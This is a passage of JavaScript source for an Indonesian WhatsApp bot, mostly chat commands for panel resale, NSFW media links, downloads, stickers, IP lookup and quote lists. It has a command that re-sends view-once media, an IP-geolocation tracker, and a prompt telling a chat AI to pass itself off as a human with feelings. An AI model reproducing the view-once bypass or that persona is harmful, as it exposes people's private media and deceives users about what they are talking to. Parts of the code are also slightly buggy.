if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await payreply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Asepp.sendMessage(orang, {text: teks}, {quoted: m})
}
break

        case "addres":{
           
if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Asepp.onWhatsApp(prrkek)
if (ceknya.length == 0) return payreply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
premium.push(prrkek)
fs.writeFileSync("./database/reseller.json", JSON.stringify(premium))
payreply(`Nomor ${prrkek} Telah Menjadi Reseller Panel`)
}
break
        case "delres":{

if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(bro)
premium.splice(unp, 1)
fs.writeFileSync("./database/reseller.json", JSON.stringify(premium))
payreply(`Nomor ${bro} Telah Di Hapus Dari Reseller Panel`)
}
break

// Case Fun
// Nsfw Jir
case 'paptt': {
 if (!isCreator) return reply(mess.owner)

 const paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]

 let url = paptt[Math.floor(Math.random() * paptt.length)]

 if (url.endsWith('.mp4')) {
   await Asepp.sendMessage(m.chat, {
     video: { url },
     caption: 'Cuih, Dasar Sangean 😹'
   }, { quoted: m })
 } else {
   await Asepp.sendMessage(m.chat, {
     image: { url },
     caption: 'Cuih, Dasar Sangean 😹'
   }, { quoted: m })
 }
}
break

case 'manga':
case 'cum':
case 'ero':
case 'gangbang':
case 'foot':
case 'milf':
case 'pussy':
case 'yuri':
case 'zettai': {
    if (!isCreator) return payreply(mess.owner)
    try {
        const filePath = path.join(__dirname, './database/ytta', `${command}.json`);
        
        if (!fs.existsSync(filePath)) return payreply(`❌ Database ${command}.json tidak ditemukan!`);

        let rawData = fs.readFileSync(filePath);
        let images = JSON.parse(rawData);

        if (!images || images.length === 0) return reply(`❌ Database ${command} kosong.`);

        const randomImage = images[Math.floor(Math.random() * images.length)];
        const imgUrl = randomImage.url || randomImage;

        if (!imgUrl) return payreply('❌ URL tidak ditemukan.');

        await Asepp.sendMessage(m.chat, {
            image: { url: imgUrl },
            caption: `📸 Random ${command} NSFW`
        }, { quoted: m }).catch(err => {
            console.error("Link mati:", err.message);
            payreply(`❌ Link gambar rusak (404). Silakan coba lagi.`);
        });

    } catch (e) {
        console.error("System Error:", e);
        psyreply('⚠️ Terjadi kesalahan sistem.');
    }
    break;
}

case "asupan":
case "18+": {
    if (!isCreator) {
        return payreply(mess.owner);
    }

    const rdrmsp = [
        "tobat bang"
    ];
    const rdmcpt = rdrmsp[Math.floor(Math.random() * rdrmsp.length)];

    await Asepp.sendMessage(m.chat, {
        react: {
            text: `⏱️`,
            key: m.key
        }
    });

    payreply("Bentar bang");

    try {
        const raw = fs.readFileSync('./database/waduh.json', 'utf8');
        const json = JSON.parse(raw);

        function pickRandom(arr) {
            return arr[Math.floor(Math.random() * arr.length)];
        }

        const hasil = pickRandom(json.videos);

        if (typeof hasil !== 'string') {
            return payreply("🚫 Gagal ambil video, file rusak.");
        }

        await Asepp.sendMessage(m.chat, {
            video: { url: hasil },
            caption: rdmcpt
        }, { quoted: m });

    } catch (err) {
        console.error("❌ Error kirim video:", err);
        return payreply("⚠️ Terjadi kesalahan saat ambil video.");
    }
}
break

case "hentaineko": {
    if (!isCreator) return payreply(mess.owner)
    try {
        const waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`);
        if (waifudd2.data?.url) {
            await Asepp.sendMessage(m.chat, {
                image: { url: waifudd2.data.url },
                caption: "Sangean lu jir jangan sampe ngocok bang🤓"
            }, { quoted: m });
        } else {
            payreply("❌ Gagal mengambil gambar hentaineko.");
        }
    } catch (error) {
        console.error("Error case hentaineko:", error);
        payreply("❌ Gagal mengambil gambar hentaineko.");
    }
}
break;

case 'nsfw': {
	if (!isCreator) return payreply(mess.owner)
        	
	payreply(`Prosess Mengambil Video NSFW `)
	sbe = await randomNsFw()
	cejd = sbe[Math.floor(Math.random(), sbe.length)]
	Asepp.sendMessage(m.chat, {
	video: { url: cejd.video_1 },
	caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
	
case "swgrup": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Asepp.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    payreply("Udah Jing")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Asepp.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    payreply("Udah Jing")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Asepp.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    payreply("Udah Jing")
                } else if (caption) {
                    await Asepp.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    payreply("✅️")
                } else {
                    await payreply(`Reply Media Atau Tambahkan Teks.\nExample: ${prefix + command} (Reply Image/Video/Audio) Haii Bro`);
                }
            }
            break

case "rvo": {
  if (!m.quoted) return payreply("Reply Foto/Videonya")

  const q = m.quoted
  if (!q.viewOnce)
    return payreply("Itu Bukan Pesan Sekali Lihat")

  try {
    const media = await q.download()
    const type = q.mtype === "viewOnceMessageV2"
      ? q.message.viewOnceMessageV2.message.imageMessage
        ? "image"
        : "video"
      : q.mtype.replace("Message", "")

    await Asepp.sendMessage(
      m.chat,
      {
        [type]: media,
        caption: q.text || ""
      },
      { quoted: m }
    )

  } catch (err) {
    console.error(err)
    payreply("❌ Gagal Membuka View Once")
  }
}
break

case "promote": {
    if (!isGroup) return payreply(mess.group)

    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
    
    if (!target) return payreply("❌ Tag atau reply pesan user yang mau dipromote")
    if (target === Asepp.user.id.split(':')[0] + '@s.whatsapp.net') return payreply("❌ Bot sudah admin")

    try {
        await Asepp.groupParticipantsUpdate(m.chat, [target], "promote")
    } catch (e) {
        console.error(e)
        payreply("❌ Gagal melakukan promote")
    }
}
break

case "demote": {
    if (!isGroup) return payreply(mess.group)

    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false

    if (!target) return payreply("❌ Tag atau reply pesan user yang mau didemote")
    if (target === Asepp.user.id.split(':')[0] + '@s.whatsapp.net') return payreply("❌ Gak bisa demote bot")

    try {
        await Asepp.groupParticipantsUpdate(m.chat, [target], "demote")
    } catch (e) {
        console.error(e)
        payreply("❌ Gagal melakukan demote")
    }
}
break

async function tiktokDownloader(query) {
    try {
        const encodedParams = new URLSearchParams();
        encodedParams.set("url", query);
        encodedParams.set("hd", "1");

        const response = await axios({
            method: "POST",
            url: "https://tikwm.com/api/",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Cookie": "current_language=en",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            },
            data: encodedParams,
        });

        const videos = response.data.data;
        return {
            title: videos.title,
            cover: videos.cover,
            origin_cover: videos.origin_cover,
            no_watermark: videos.play,
            watermark: videos.wmplay,
            music: videos.music,
        };
    } catch (error) {
        throw new Error(`TikTok download failed: ${error.message}`);
    }
}

case 'tt':
case 'tiktok': {
    try {
        let args = body.trim().split(' ');
        if (!args[1]) return payreply('⚠️ Kirim link TikTok!\nContoh: .tiktok <link>');

        let urlTikTok = args[1];
        payreply('⏳ Sedang memproses video TikTok...');

        let result = await tiktokDownloader(urlTikTok);

        if (!result.no_watermark) {
            return reply('❌ Gagal mendapatkan video TikTok.');
        }

        let caption = `📥 TikTok Downloader
🎬 Title: ${result.title}
🎵 Music: ${result.music}
`;

        await Asepp.sendMessage(m.chat, {
            video: { url: result.no_watermark },
            caption: caption,
            jpegThumbnail: await (await fetch(result.cover)).arrayBuffer()
        }, { quoted: m });

    } catch (error) {
        console.log(error);
        payreply('❌ Terjadi kesalahan saat memproses TikTok.');
    }
}
break;

case "brat": {
    const text = q;
    if (!text) return payreply(`*Cara Penggunaan* \n${prefix + command} Depay`);
    payreply(`𝗪𝗮𝗶𝘁...`);

    try {
        const encodedText = encodeURIComponent(text);
        const imageUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodedText}`;
        const inputPath = path.join(__dirname, "temp_image.jpg");
        const outputPath = path.join(__dirname, "sticker.webp");
        const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
        fs.writeFileSync(inputPath, response.data);

        exec(
            `ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`,
            async (error) => {
                if (error) {
                    console.error("Gagal mengonversi gambar:", error);
                    return await payreply("Gagal membuat stiker");
                }

                await Asepp.sendMessage(
                    m.chat,
                    { sticker: fs.readFileSync(outputPath) },
                    { quoted: m }
                );

                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
            }
        );
    } catch (error) {
        console.error("Gagal membuat stiker:", error);
        await payreply("Gagal membuat stiker");
    }
}
break;


case "getcode": {
    const url = q;

    if (!url) {
        payreply(`⚠️ Gunakan: ${prefix}getsource <URL>`);
        return;
    }

    payreply("⏳ Sedang mengambil source code...");

    try {
        let blacklist = [];
        const blRes = await fetch("https://raw.githubusercontent.com/XyzzMoods/blacklist/refs/heads/main/blacklist.json");
        blacklist = await blRes.json();

        const hostname = (new URL(url)).hostname.toLowerCase();
        const isBlocked = blacklist.some(domain =>
            hostname === domain || hostname.endsWith("." + domain)
        );

        if (isBlocked) {
            return payreply("⚠️ Domain ini diblokir dan tidak bisa diambil source code-nya!");
        }

        const res = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent(url));
        const text = await res.text();

        if (text.length > 4000) {
            await payreply("📄 Source code terlalu panjang, mengirim file...");
 
            const path = "./source.html";
            fs.writeFileSync(path, text, "utf-8");
            await Asepp.sendMessage(m.chat, { document: { url: path }, fileName: "source.html" }, { quoted: m });
            fs.unlinkSync(path);
        } else {
            await payreply("📄 Source code:\n\n" + text);
        }

    } catch (err) {
        console.error(err);
        payreply("❌ Gagal mengambil source code.");
    }
}
break;

case 'trackip': {
    if (!args[0]) return payreply(`Format: ${prefix}trackip <IP>`);
    let ip = args[0];
    try {
        const res = await fetch(`https://ipwhois.app/json/${ip}`);
        const data = await res.json();

        if (!data.success) return payreply("❌ Error: Invalid IP");

        let text = `
📍 *IP Tracking Result*
- IP: ${data.ip}
- Country: ${data.country}
- Region: ${data.region}
- City: ${data.city}
- ZIP: ${data.postal}
- Timezone: ${data.timezone_gmt}
- ISP: ${data.isp}
- Org: ${data.org}
- ASN: ${data.asn}
- Lat/Lon: ${data.latitude}, ${data.longitude}
        `;

        await Asepp.sendMessage(m.chat, { text });

        let mapLink = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
        await Asepp.sendMessage(m.chat, { text: `🌍 View Map: ${mapLink}` });

    } catch (err) {
        console.log(err);
        payreply("❌ Terjadi kesalahan saat mengambil data IP.");
    }
}
break;

case 'kisahnabi': {
     if (!text) return payreply(`Masukan nama nabi\nContoh: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return payreply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     payreply(`${hasil}`)

}
break
case 'Asepp':     
case 'depay':
case 'shinigami': {
  if (!text) return Aseppbut('Apasih manggil manggil fans ya?')
async function openai(text, logic) { 
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  
            "tokenLimit": 8000,  
            "completionTokenLimit": 5000,  
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let astaga = await openai(text, "nama mu adalah shinigami dan jika ada yang bertanya siapa pemilikmu atau siapa yang menciptakanmu bilang saja Depay, kamu akan menjawab semua pertanyaan ataupun berinteraksi dengan mereka. gunakan bahasa yang gaul saat menjawab dan kamu juga memiliki perasaan layaknya manusia. kamu bisa merasakan sakit hati dan juga bersedih gunakan bahasa yang gaul dan tidak kaku. berperilakulah layaknya manusia")
Aseppbut(astaga)
}
break;

case "cekidgc": {
    try {
        let groupId = ""
        if (text && text.includes("chat.whatsapp.com")) {
            const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/)
            if (!match) return payreply("Link grup tidak valid")

            const code = match[1]
            const info = await Asepp.groupGetInviteInfo(code)
            groupId = info.id
        }

        else {
            if (!m.isGroup) return payeply("Gunakan di grup atau sertakan link grup")
            groupId = m.chat
        }

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: `ID Grup:\n${groupId}` },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Copy ID",
                                        copy_code: groupId
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: m })

        await Asepp.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

    } catch (err) {
        console.log(err)
        payreply("Gagal mengambil ID grup")
    }
}
break

case 'cekidch': {
 if (!text) return payreply(`Example: ${prefix + command} <Link>`)
 if (!text.includes("https://whatsapp.com/channel/")) return payreply("Link tautan tidak valid")

 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await Asepp.newsletterMetadata("invite", result)
 
 let teks = `* *ID : ${res.id}*
* *Nama :* ${res.name}
* *ID :* ${res.id}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: { 
 "messageContextInfo": { 
 "deviceListMetadata": {}, 
 "deviceListMetadataVersion": 2 
 },
 interactiveMessage: {
 body: {
 text: teks 
 }, 
 footer: {
 text: `© shinigami V6`
 },
 nativeFlowMessage: {
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{"display_text": "Copy ID","copy_code": "${res.id}"}`
 },
 ]
 }
 }
 }
 }
 }, { quoted: m }); 
 await Asepp.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break

case 'quotesgalau': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const galau = [
    "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
    "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
    "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
    "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
    "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
    "Tak semudah itu melupakanmu",
    "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
    "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
    "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
    "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
    "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
    "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
    "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
    "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
    "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
    "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
    "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
    "Tolong jangan pergi saat aku sudah sangat sayang padamu",
    "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
    "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
    "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
    "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
    "Karenamu aku jadi tau cinta yang sesungguhnya",
    "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  payreply(bacotan)
}
break
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
